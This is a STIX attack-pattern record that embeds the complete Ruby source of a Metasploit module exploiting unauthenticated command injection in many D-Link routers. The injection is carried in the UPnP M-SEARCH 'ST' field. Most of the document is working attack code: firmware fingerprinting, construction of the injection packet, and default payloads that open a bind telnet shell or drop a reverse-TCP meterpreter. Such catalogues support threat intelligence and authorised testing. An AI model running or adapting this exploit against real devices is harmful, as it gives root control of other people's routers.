{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0565abd-d264-4fa9-9147-8d70e803b582",
    "created": "2024-08-14T16:58:27.413491Z",
    "modified": "2024-08-14T16:58:27.413495Z",
    "name": "D-Link Unauthenticated Remote Command Execution using UPnP via a special crafted M-SEARCH packet.",
    "description": " A command injection vulnerability exists in multiple D-Link network products, allowing an attacker to inject arbitrary command to the UPnP via a crafted M-SEARCH packet. Universal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900. An attacker can perform a remote command execution by injecting the payload into the `Search Target` (ST) field of the SSDP M-SEARCH discover packet. After successful exploitation, an attacker will have full access with `root` user privileges.  NOTE: Staged meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads when using the Linux Dropper target. Some D-Link devices do not have the `wget` command so configure `echo` as flavor with the command set CMDSTAGER::FLAVOR echo.  The following D-Link network products and firmware are vulnerable: - D-Link Router model GO-RT-AC750 revisions Ax with firmware v1.01 or older; - D-Link Router model DIR-300 revisions Ax with firmware v1.06 or older; - D-Link Router model DIR-300 revisions Bx with firmware v2.15 or older; - D-Link Router model DIR-600 revisions Bx with firmware v2.18 or older; - D-Link Router model DIR-645 revisions Ax with firmware v1.05 or older; - D-Link Router model DIR-815 revisions Bx with firmware v1.04 or older; - D-Link Router model DIR-816L revisions Bx with firmware v2.06 or older; - D-Link Router model DIR-817LW revisions Ax with firmware v1.04b01_hotfix or older; - D-Link Router model DIR-818LW revisions Bx with firmware v2.05b03_Beta08 or older; - D-Link Router model DIR-822 revisions Bx with firmware v2.03b01 or older; - D-Link Router model DIR-822 revisions Cx with firmware v3.12b04 or older; - D-Link Router model DIR-823 revisions Ax with firmware v1.00b06_Beta or older; - D-Link Router model DIR-845L revisions Ax with firmware v1.02b05 or older; - D-Link Router model DIR-860L revisions Ax with firmware v1.12b05 or older; - D-Link Router model DIR-859 revisions Ax with firmware v1.06b01Beta01 or older; - D-Link Router model DIR-860L revisions Ax with firmware v1.10b04 or older; - D-Link Router model DIR-860L revisions Bx with firmware v2.03b03 or older; - D-Link Router model DIR-865L revisions Ax with firmware v1.07b01 or older; - D-Link Router model DIR-868L revisions Ax with firmware v1.12b04 or older; - D-Link Router model DIR-868L revisions Bx with firmware v2.05b02 or older; - D-Link Router model DIR-869 revisions Ax with firmware v1.03b02Beta02 or older; - D-Link Router model DIR-880L revisions Ax with firmware v1.08b04 or older; - D-Link Router model DIR-890L/R revisions Ax with firmware v1.11b01_Beta01 or older; - D-Link Router model DIR-885L/R revisions Ax with firmware v1.12b05 or older; - D-Link Router model DIR-895L/R revisions Ax with firmware v1.12b10 or older; - probably more looking at the scale of impacted devices :-(  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/upnp/dlink_upnp_msearch_exec.rb",
            "external_id": "dlink_upnp_msearch_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-33625"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-15893"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-20215"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/uqicA23ecz/cve-2023-33625"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73"
        },
        {
            "source_name": "reference",
            "url": "https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html"
        },
        {
            "source_name": "reference",
            "url": "https://research.loginsoft.com/vulnerability/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::Udp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'D-Link Unauthenticated Remote Command Execution using UPnP via a special crafted M-SEARCH packet.',\n        'Description' => %q{\n          A command injection vulnerability exists in multiple D-Link network products, allowing an attacker\n          to inject arbitrary command to the UPnP via a crafted M-SEARCH packet.\n          Universal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900.\n          An attacker can perform a remote command execution by injecting the payload into the\n          `Search Target` (ST) field of the SSDP M-SEARCH discover packet.\n          After successful exploitation, an attacker will have full access with `root` user privileges.\n\n          NOTE: Staged meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads\n          when using the Linux Dropper target. Some D-Link devices do not have the `wget` command so\n          configure `echo` as flavor with the command set CMDSTAGER::FLAVOR echo.\n\n          The following D-Link network products and firmware are vulnerable:\n          - D-Link Router model GO-RT-AC750 revisions Ax with firmware v1.01 or older;\n          - D-Link Router model DIR-300 revisions Ax with firmware v1.06 or older;\n          - D-Link Router model DIR-300 revisions Bx with firmware v2.15 or older;\n          - D-Link Router model DIR-600 revisions Bx with firmware v2.18 or older;\n          - D-Link Router model DIR-645 revisions Ax with firmware v1.05 or older;\n          - D-Link Router model DIR-815 revisions Bx with firmware v1.04 or older;\n          - D-Link Router model DIR-816L revisions Bx with firmware v2.06 or older;\n          - D-Link Router model DIR-817LW revisions Ax with firmware v1.04b01_hotfix or older;\n          - D-Link Router model DIR-818LW revisions Bx with firmware v2.05b03_Beta08 or older;\n          - D-Link Router model DIR-822 revisions Bx with firmware v2.03b01 or older;\n          - D-Link Router model DIR-822 revisions Cx with firmware v3.12b04 or older;\n          - D-Link Router model DIR-823 revisions Ax with firmware v1.00b06_Beta or older;\n          - D-Link Router model DIR-845L revisions Ax with firmware v1.02b05 or older;\n          - D-Link Router model DIR-860L revisions Ax with firmware v1.12b05 or older;\n          - D-Link Router model DIR-859 revisions Ax with firmware v1.06b01Beta01 or older;\n          - D-Link Router model DIR-860L revisions Ax with firmware v1.10b04 or older;\n          - D-Link Router model DIR-860L revisions Bx with firmware v2.03b03 or older;\n          - D-Link Router model DIR-865L revisions Ax with firmware v1.07b01 or older;\n          - D-Link Router model DIR-868L revisions Ax with firmware v1.12b04 or older;\n          - D-Link Router model DIR-868L revisions Bx with firmware v2.05b02 or older;\n          - D-Link Router model DIR-869 revisions Ax with firmware v1.03b02Beta02 or older;\n          - D-Link Router model DIR-880L revisions Ax with firmware v1.08b04 or older;\n          - D-Link Router model DIR-890L/R revisions Ax with firmware v1.11b01_Beta01 or older;\n          - D-Link Router model DIR-885L/R revisions Ax with firmware v1.12b05 or older;\n          - D-Link Router model DIR-895L/R revisions Ax with firmware v1.12b10 or older;\n          - probably more looking at the scale of impacted devices :-(\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor\n          'Zach Cutlip', # Discovery of the vulnerability\n          'Michael Messner <devnull@s3cur1ty.de>',\n          'Miguel Mendez Z. (s1kr10s)',\n          'Pablo Pollanco (secenv)',\n          'Naihsin https://github.com/naihsin'\n\n        ],\n        'References' => [\n          ['CVE', '2023-33625'],\n          ['CVE', '2020-15893'],\n          ['CVE', '2019-20215'],\n          ['URL', 'https://attackerkb.com/topics/uqicA23ecz/cve-2023-33625'],\n          ['URL', 'https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection'],\n          ['URL', 'https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73'],\n          ['URL', 'https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html'],\n          ['URL', 'https://research.loginsoft.com/vulnerability/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/'],\n          ['URL', 'https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md']\n        ],\n        'DisclosureDate' => '2013-02-01',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_MIPSLE, ARCH_MIPSBE, ARCH_ARMLE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_MIPSLE, ARCH_MIPSBE, ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['echo', 'wget'],\n              'Linemax' => 900,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 1900,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('URN', [true, 'Set URN payload', 'urn:device:1']),\n      OptPort.new('HTTP_PORT', [true, 'The HTTP port for the HTTP and SOAP requests sent to detect versions', 80])\n    ])\n  end\n\n  def vuln_version?(res)\n    # checks the model, firmware and hardware version\n    @d_link = { 'product' => nil, 'firmware' => nil, 'hardware' => nil, 'arch' => nil }\n    html = Nokogiri.HTML(res.body, nil, 'UTF-8')\n\n    # USE CASE #1: D-link devices with static HTML pages with model and version information\n    # class identifiers: <span class=\"product\">, <span class=\"version\"> and <span class=\"hwversion\">\n    # See USE CASE #4 for D-link devices that use javascript to dynamically generate the model and firmware version\n    product = html.css('span[@class=\"product\"]')\n    @d_link['product'] = product[0].text.split(':')[1].strip unless product[0].nil?\n    firmware = html.css('span[@class=\"version\"]')\n    @d_link['firmware'] = firmware[0].text.split(':')[1].strip.delete(' ') unless firmware[0].nil?\n\n    # DIR-600, DIR-300 hardware B revision  and maybe other models are using the \"version\" class tag for both firmware and hardware version\n    @d_link['hardware'] = firmware[1].text.split(':')[1].strip unless firmware[1].nil?\n    # otherwise search for the \"hwversion\" class tag\n    hardware = html.css('span[@class=\"hwversion\"]')\n    @d_link['hardware'] = hardware[0].text.split(':')[1].strip unless hardware[0].nil?\n\n    # USE CASE #2: D-link devices with static HTML pages with model and version information\n    # class identifiers: <div class=\"pp\">, <div class=\"fwv\"> and <div class=\"hwv\">\n    if @d_link['product'].nil?\n      product = html.css('div[@class=\"pp\"]')\n      @d_link['product'] = product[0].text.split(':')[1].strip unless product[0].nil?\n      firmware = html.css('div[@class=\"fwv\"]')\n      @d_link['firmware'] = firmware[0].text.split(':')[1].strip.delete(' ') unless firmware[0].nil?\n      hardware = html.css('div[@class=\"hwv\"]')\n      @d_link['hardware'] = hardware[0].text.split(':')[1].strip unless hardware[0].nil?\n    end\n\n    # USE CASE #3: D-link devices with html below for model, firmware and hardware version\n    # <td>Product Page&nbsp;:&nbsp;<a href='http://support.dlink.com.tw'  target=_blank><font class=l_tb>DIR-300</font></a>&nbsp;&nbsp;&nbsp;</td>\n    # <td noWrap align=\"right\">Hardware Version&nbsp;:&nbsp;rev N/A&nbsp;</td>\n    # <td noWrap align=\"right\">Firmware Version&nbsp;:&nbsp;1.06&nbsp;</td>\n    if @d_link['product'].nil?\n      hwinfo_table = html.css('td')\n      hwinfo_table.each do |hwinfo|\n        @d_link['product'] = hwinfo.text.split(':')[1].strip.gsub(/\\p{Space}*/u, '') if hwinfo.text =~ /Product Page/i || hwinfo.text =~ /Product/i\n        @d_link['hardware'] = hwinfo.text.split(':')[1].strip.gsub(/\\p{Space}*/u, '') if hwinfo.text =~ /Hardware Version/i\n        @d_link['firmware'] = hwinfo.text.split(':')[1].strip.gsub(/\\p{Space}*/u, '') if hwinfo.text =~ /Firmware Version/i\n      end\n    end\n\n    # USE CASE #4: D-Link devices with HTML listed below that contains the model, firmware and hardware version\n    # <table id=\"header_container\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\" width=\"838\" align=\"center\">\n    # <tr>\n    #   <td width=\"100%\">&nbsp;&nbsp;<script>show_words(TA2)</script>: <a href=\"http://support.dlink.com.tw/\">DIR-835</a></td>\n    #   <td align=\"right\" nowrap><script>show_words(TA3)</script>: A1 &nbsp;</td>\n    #   <td align=\"right\" nowrap><script>show_words(sd_FWV)</script>: 1.04</td>\n    #   <td>&nbsp;</td>\n    # </tr>\n    # </table>\n    if @d_link['product'].nil?\n      hwinfo_table = html.css('table#header_container td')\n      hwinfo_table.each do |hwinfo|\n        @d_link['product'] = hwinfo.text.split(':')[1].strip.gsub(/\\p{Space}*/u, '') if hwinfo.text =~ /show_words\\(TA2\\)/i\n        @d_link['hardware'] = hwinfo.text.split(':')[1].strip.gsub(/\\p{Space}*/u, '') if hwinfo.text =~ /show_words\\(TA3\\)/i\n        @d_link['firmware'] = hwinfo.text.split(':')[1].strip.gsub(/\\p{Space}*/u, '') if hwinfo.text =~ /show_words\\(sd_FWV\\)/i\n      end\n    end\n\n    # USE CASE #5: D-Link devices with dynamically generated version and hardware information\n    # Create HNAP POST request to get these hardware details\n    if @d_link['product'].nil?\n      xml_soap_data = <<~EOS\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\n          <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n            <soap:Body>\n              <GetDeviceSettings xmlns=\"http://purenetworks.com/HNAP1/\" />\n            </soap:Body>\n          </soap:Envelope>\n      EOS\n      res = send_request_cgi({\n        'rport' => datastore['HTTP_PORT'],\n        'method' => 'POST',\n        'ctype' => 'text/xml',\n        'uri' => normalize_uri(target_uri.path, 'HNAP1', '/'),\n        'data' => xml_soap_data.to_s,\n        'headers' => {\n          'SOAPACTION' => '\"http://purenetworks.com/HNAP1/GetDeviceSettings\"'\n        }\n      })\n      if res && res.code == 200 && res.body.include?('<GetDeviceSettingsResult>OK</GetDeviceSettingsResult>')\n        xml = res.get_xml_document\n        unless xml.blank?\n          xml.remove_namespaces!\n          @d_link['product'] = xml.css('ModelName').text\n          @d_link['firmware'] = xml.css('FirmwareVersion').text.delete(' ')\n          @d_link['hardware'] = xml.css('HardwareVersion').text\n        end\n      end\n    end\n\n    # USE CASE #6: D-Link devices with dynamically generated version and hardware information\n    # Create a DHMAPI POST request to get these hardware details\n    if @d_link['product'].nil?\n      xml_soap_data = <<~EOS\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\n          <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n            <soap:Body>\n              <GetDeviceSettings/>\n            </soap:Body>\n          </soap:Envelope>\n      EOS\n      res = send_request_cgi({\n        'rport' => datastore['HTTP_PORT'],\n        'method' => 'POST',\n        'ctype' => 'text/xml',\n        'uri' => normalize_uri(target_uri.path, 'DHMAPI', '/'),\n        'data' => xml_soap_data.to_s,\n        'headers' => {\n          'API-ACTION' => 'GetDeviceSettings'\n        }\n      })\n      if res && res.code == 200 && res.body.include?('<GetDeviceSettingsResult>OK</GetDeviceSettingsResult>')\n        xml = res.get_xml_document\n        unless xml.blank?\n          xml.remove_namespaces!\n          @d_link['product'] = xml.css('ModelName').text\n          @d_link['firmware'] = xml.css('FirmwareVersion').text.delete(' ')\n          @d_link['hardware'] = xml.css('HardwareVersion').text\n        end\n      end\n    end\n\n    # check the vulnerable product and firmware versions\n    case @d_link['product']\n    when 'GO-RT-AC750'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.01') && @d_link['hardware'][0] == 'A'\n    when 'DIR-300'\n      if Rex::Version.new(@d_link['firmware']) >= Rex::Version.new('2.00') && Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.15') # hardware version B\n        @d_link['arch'] = 'mipsle'\n        return true\n      elsif Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.06') # hardware version A\n        @d_link['arch'] = 'mipsbe'\n        return true\n      end\n    when 'DIR-600'\n      @d_link['arch'] = 'mipsle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.18') && @d_link['hardware'][0] == 'B'\n    when 'DIR-645'\n      @d_link['arch'] = 'mipsle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.05') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')\n    when 'DIR-815'\n      @d_link['arch'] = 'mipsle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.04')\n    when 'DIR-816L'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.06') && (@d_link['hardware'][0] == 'B' || @d_link['hardware'] == 'N/A')\n    when 'DIR-817LW'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.04') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')\n    when 'DIR-818LW', 'DIR-818L'\n      @d_link['arch'] = 'mipsbe'\n      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.04') && @d_link['hardware'][0] == 'B'\n\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.05') && @d_link['hardware'][0] == 'A'\n    when 'DIR-822'\n      @d_link['arch'] = 'mipsbe'\n      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.03') && @d_link['hardware'][0] == 'B'\n\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('3.12') && @d_link['hardware'][0] == 'C'\n    when 'DIR-823'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.00') && @d_link['hardware'][0] == 'A'\n    when 'DIR-845L'\n      @d_link['arch'] = 'mipsle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.02') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')\n    when 'DIR-850L'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && (@d_link['hardware'][0] == 'A' || @d_link['hardware'] == 'N/A')\n    when 'DIR-859'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.06') && @d_link['hardware'][0] == 'A'\n    when 'DIR-860L'\n      @d_link['arch'] = 'armle'\n      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.10') && @d_link['hardware'][0] == 'A'\n\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.03') && @d_link['hardware'][0] == 'B'\n    when 'DIR-865L'\n      @d_link['arch'] = 'mipsle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.07') && @d_link['hardware'][0] == 'A'\n    when 'DIR-868L'\n      @d_link['arch'] = 'armle'\n      return true if Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && @d_link['hardware'][0] == 'A'\n\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('2.05') && @d_link['hardware'][0] == 'B'\n    when 'DIR-869'\n      @d_link['arch'] = 'mipsbe'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.03') && @d_link['hardware'][0] == 'A'\n    when 'DIR-880L'\n      @d_link['arch'] = 'armle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.08') && @d_link['hardware'][0] == 'A'\n    when 'DIR-890L', 'DIR-890R'\n      @d_link['arch'] = 'armle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.11') && @d_link['hardware'][0] == 'A'\n    when 'DIR-885L', 'DIR-885R'\n      @d_link['arch'] = 'armle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && @d_link['hardware'][0] == 'A'\n    when 'DIR-895L', 'DIR-895R'\n      @d_link['arch'] = 'armle'\n      return Rex::Version.new(@d_link['firmware']) <= Rex::Version.new('1.12') && @d_link['hardware'][0] == 'A'\n    end\n    false\n  end\n\n  def execute_command(cmd, _opts = {})\n    payload = \"#{datastore['URN']};`#{cmd}`\"\n\n    connect_udp\n    header = \"M-SEARCH * HTTP/1.1\\r\\n\"\n    header << 'HOST:' + datastore['RHOST'].to_s + ':' + datastore['RPORT'].to_s + \"\\r\\n\"\n    header << \"ST:#{payload}\\r\\n\"\n    header << \"MX:2\\r\\n\"\n    header << \"MAN:\\\"ssdp:discover\\\"\\r\\n\\r\\n\"\n    udp_sock.put(header)\n    disconnect_udp\n  end\n\n  def check\n    print_status(\"Checking if #{peer} can be exploited.\")\n    res = send_request_cgi!({\n      'rport' => datastore['HTTP_PORT'],\n      'method' => 'GET',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'uri' => normalize_uri(target_uri.path)\n    })\n    # Check if target is a D-Link network device\n    return CheckCode::Unknown('No response received from target.') unless res\n    return CheckCode::Safe('Likely not a D-Link network device.') unless res.code == 200 && res.body =~ /d-?link/i\n\n    # check if firmware version is vulnerable\n    return CheckCode::Appears(\"Product info: #{@d_link['product']}|#{@d_link['firmware']}|#{@d_link['hardware']}|#{@d_link['arch']}\") if vuln_version?(res)\n    # D-link devices with fixed firmware versions\n    return CheckCode::Safe(\"Product info: #{@d_link['product']}|#{@d_link['firmware']}|#{@d_link['hardware']}|#{@d_link['arch']}\") unless @d_link['arch'].nil?\n    # D-link devices that still could be vulnerable with product information\n    return CheckCode::Detected(\"Product info: #{@d_link['product']}|#{@d_link['firmware']}|#{@d_link['hardware']}|#{@d_link['arch']}\") unless @d_link['product'].nil?\n\n    # D-link devices that still could be vulnerable but no product information available\n    return CheckCode::Detected\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager({ linemax: target.opts['Linemax'] })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}